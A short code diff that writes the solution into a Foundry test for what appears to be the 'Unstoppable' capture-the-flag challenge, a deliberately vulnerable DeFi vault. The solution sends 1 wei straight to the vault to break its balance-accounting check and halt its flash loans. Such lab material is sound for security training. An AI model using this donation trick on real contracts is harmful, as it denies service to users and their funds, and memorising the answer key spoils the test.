@@ -91,7 +91,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+
+        // Just transfer 1 wei to mess up the logic
+        token.transfer(address(vault), 1);
     }
 
     /**
